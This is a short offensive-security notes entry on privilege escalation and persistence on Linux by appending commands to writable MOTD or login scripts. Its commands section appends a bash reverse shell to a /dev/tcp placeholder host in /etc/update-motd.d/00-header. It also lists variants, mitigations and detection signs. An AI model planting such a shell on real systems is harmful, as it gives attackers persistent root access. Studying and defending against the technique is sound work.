---
topic: Linux — writable login scripts
tags: [linux, motd, login, persistence, privesc]
---

# Linux — writable login scripts

**English** | [🌐 Español](login-script-append.md)

## Concept

MOTD and login scripts run when a session opens, often as root. If a user can append content to one, they gain persistence and privileged execution without modifying the whole file. Group permissions or a writable directory are enough.

## When it applies

- `/etc/update-motd.d/` or a login script is writable by the user.
- The script runs on every SSH or login.
- A simple escalation from a local account is needed.

## Procedure

1. List MOTD/login scripts and permissions.
2. Check whether the user can append.
3. Add a command that launches a shell.
4. Open a new SSH session and verify the UID.

## Commands

```bash
ls -la /etc/update-motd.d/
ls -la /etc/profile.d/
echo 'bash -i >& /dev/tcp/<IP>/4444 0>&1' >> /etc/update-motd.d/00-header
ssh <USER>@<HOST>
```

## Variants

- Edit a `profile.d` script or root `.bashrc`.
- Abuse a writable directory included by wildcard.
- Use a PAM script or `pam_exec`.

## Limitations

- The script may run as the user, not root.
- The file may be immutable.
- The session must restart.

## Mitigation

- Mount login scripts read-only.
- Audit group permissions and `sudo` on `/etc`.
- Avoid login scripts executing editable content.

## Detection

- Changes to MOTD or `profile.d` scripts.
- SSH connections spawning unusual processes.
- Recently appended files by non-root users.

## References

- [0xdf — Late](https://0xdf.gitlab.io/2022/07/30/htb-late.html)
- [Ubuntu — update-motd](https://manpages.ubuntu.com/manpages/noble/man5/update-motd.5.html)
- [CWE-732 — Incorrect Permission Assignment](https://cwe.mitre.org/data/definitions/732.html)
